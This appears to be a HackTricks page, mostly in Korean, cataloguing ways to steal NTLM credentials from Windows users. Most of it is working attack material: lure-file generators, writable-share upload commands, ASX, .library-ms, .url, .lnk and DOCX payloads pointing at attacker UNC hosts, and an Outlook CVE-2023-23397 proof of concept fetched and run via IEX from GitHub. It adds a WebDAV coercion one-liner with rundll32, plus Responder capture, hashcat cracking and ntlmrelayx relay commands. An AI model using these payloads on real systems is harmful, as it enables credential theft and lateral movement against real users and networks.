# NTLM 자격 증명을 훔칠 수 있는 위치

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)에서 확인할 수 있는 모든 훌륭한 아이디어를 살펴보세요. 여기에는 온라인에서 microsoft word 파일을 다운로드하는 것부터 NTLM leak의 source인 https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)까지 포함됩니다.**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**사용자 또는 scheduled jobs가 Explorer에서 탐색하는 share에 write할 수 있다면**, metadata가 사용자의 UNC(예: `\\ATTACKER\share`)를 가리키는 파일을 업로드하세요. 폴더를 렌더링하면 **implicit SMB authentication**이 트리거되고 **NetNTLMv2**가 listener로 leak됩니다.<sup>[[1]](#references)</sup>

1. **lures 생성** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. 포함)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **쓰기 가능한 공유 폴더에 배치** (피해자가 여는 모든 폴더):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows는 한 번에 여러 파일에 접근할 수 있으며, Explorer가 미리 보기하는 모든 항목(`BROWSE TO FOLDER`)에는 클릭이 필요하지 않습니다.

### Windows Media Player playlists (.ASX/.WAX)

대상이 사용자가 제어하는 Windows Media Player playlist를 열거나 미리 보도록 유도할 수 있다면, 항목이 UNC path를 가리키도록 설정하여 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 media를 SMB를 통해 가져오려고 시도하며, 이 과정에서 암묵적으로 authenticate합니다.<sup>[[3]](#references)[[4]](#references)</sup>

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 cracking 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP archive 내부에서 직접 열리는 .library-ms 파일을 안전하지 않게 처리합니다. library definition이 remote UNC path(예: \\attacker\share)를 가리키는 경우, ZIP 내부의 .library-ms를 단순히 탐색하거나 실행하는 것만으로도 Explorer가 UNC를 열거하고 attacker에게 NTLM authentication을 전송합니다. 이로 인해 offline에서 crack하거나 잠재적으로 relay할 수 있는 NetNTLMv2가 노출됩니다.<sup>[[2]](#references)</sup>

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
운영 단계
- 위의 XML을 사용하여 .library-ms 파일을 생성합니다(IP/hostname을 설정).
- 파일을 ZIP으로 압축합니다(Windows: 보내기 → 압축(zipped) 폴더). 그런 다음 ZIP을 target에 전달합니다.
- NTLM capture listener를 실행하고 victim이 ZIP 내부에서 .library-ms 파일을 열 때까지 기다립니다.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows는 calendar items에서 extended MAPI property PidLidReminderFileParameter를 처리했습니다. 해당 property가 UNC path(예: \\attacker\share\alert.wav)를 가리키는 경우, reminder가 실행될 때 Outlook이 SMB share에 접속하여 아무런 click 없이 사용자의 Net‑NTLMv2를 leak했습니다. 이 문제는 2023년 3월 14일에 patch되었지만, legacy/untouched fleet와 과거 incident response에서는 여전히 매우 중요합니다.<sup>[[5]](#references)</sup>

PowerShell (Outlook COM)을 사용한 빠른 exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
참고
- 피해자는 reminder가 트리거될 때 Outlook for Windows가 실행 중이기만 하면 됩니다.
- 이 leak으로 오프라인 cracking 또는 relay에 사용할 수 있는 Net‑NTLMv2를 획득할 수 있습니다(pass-the-hash는 아님).


### .LNK/.URL 아이콘 기반 zero‑click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 우회)

Windows Explorer는 shortcut 아이콘을 자동으로 렌더링합니다. 최근 연구에 따르면 UNC 아이콘 shortcut에 대한 Microsoft의 2025년 4월 패치 이후에도 shortcut target을 UNC path에서 호스팅하고 icon은 local에 유지하면 클릭 없이 NTLM authentication을 트리거할 수 있었습니다(패치 우회에 CVE‑2025‑50154가 할당됨). 폴더를 보기만 해도 Explorer가 remote target에서 metadata를 가져오며 attacker의 SMB server로 NTLM을 전송합니다.<sup>[[6]](#references)</sup>

최소 Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell을 통한 프로그램 바로 가기 payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery 아이디어
- 바로가기를 ZIP에 넣고 피해자가 이를 탐색하도록 유도합니다.
- 피해자가 열게 될 쓰기 가능한 공유에 바로가기를 배치합니다.
- 같은 폴더에 다른 lure 파일도 함께 배치하여 Explorer가 항목을 미리 보도록 합니다.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows는 실행할 때뿐만 아니라 **view/preview** 중에도 아이콘 렌더링을 위해 `.lnk` 메타데이터를 로드합니다. CVE‑2026‑25185는 **ExtraData** 블록으로 인해 셸이 **load** 중 아이콘 경로를 확인하고 파일 시스템에 접근하는 parsing path를 보여 줍니다. 이 경로가 원격 경로인 경우 outbound NTLM을 발생시킵니다.

주요 trigger 조건(`CShellLink::_LoadFromStream`에서 관찰됨):
- ExtraData에 **DARWIN_PROPS** (`0xa0000006`)를 포함합니다(icon update routine으로 진입하기 위한 gate).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)를 포함하고 `TargetUnicode`를 채웁니다.
- loader는 `TargetUnicode`의 environment variable을 확장한 후 결과 경로에 대해 `PathFileExistsW`를 호출합니다.

`TargetUnicode`가 UNC 경로(예: `\\attacker\share\icon.ico`)로 resolve되면, 바로가기가 포함된 폴더를 **merely viewing**하는 것만으로도 outbound authentication이 발생합니다. 동일한 load path는 **indexing** 및 **AV scanning**을 통해서도 실행될 수 있으므로, 실용적인 no-click leak surface가 됩니다.<sup>[[7]](#references)</sup>

Windows GUI를 사용하지 않고 이러한 구조를 build/inspect할 수 있도록 Research tooling(parser/generator/UI)이 **LnkMeMaybe** project에 제공됩니다.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

네이티브 **WebDAV client**를 악용하면 현재 logon session이 임의의 **HTTP/WebDAV** endpoint에 인증하도록 강제할 수 있습니다:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
유용한 이유:
- **attacker-controlled WebDAV server**를 대상으로 custom client를 배포하지 않고도 **NTLM over HTTP**를 trigger할 수 있습니다.
- **internal hosts**를 대상으로는 lateral movement를 수행하기 전에 stolen credentials가 어디에서 허용되는지 조용히 **validate**할 수 있습니다.<sup>[[9]](#references)</sup>
- **SMB egress**가 filtered되었지만 **HTTP/WebDAV**는 여전히 reachable한 경우 좋은 alternative입니다.

운영 참고 사항:
- 소스 host에서 **WebClient** service가 실행 중이어야 합니다.
- `rundll32.exe`는 `davclnt.dll`을 load하고, Windows가 **current user's credentials**를 사용해 WebDAV authentication을 처리하도록 합니다.<sup>[[10]](#references)</sup>
- 자신이 control하는 infrastructure를 가리키는 경우 다음과 같은 NTLM-aware HTTP listener/relay를 사용합니다:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
탐지 관점에서 여러 내부 시스템을 대상으로 반복적으로 `rundll32.exe davclnt.dll,DavSetCookie`를 실행하는 것은 정상적인 사용자 동작이라기보다 **자격 증명 검증 / spray와 유사한 lateral movement 준비**를 강하게 나타내는 신호입니다.<sup>[[9]](#references)[[11]](#references)</sup>

### Office 원격 템플릿 주입(.docx/.dotm)을 통한 NTLM 유도

Office 문서는 외부 템플릿을 참조할 수 있습니다. 연결된 템플릿을 UNC 경로로 설정하면 문서를 열 때 SMB에 인증합니다.

최소 DOCX 관계 변경 사항(`word/` 내부):

1) `word/settings.xml`을 편집하고 연결된 템플릿 참조를 추가합니다:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels를 편집하고 rId1337이 사용자의 UNC를 가리키도록 합니다:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 Repack하여 전달합니다. SMB capture listener를 실행하고 열릴 때까지 기다립니다.

NTLM capture 후 relay 또는 abuse에 대한 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
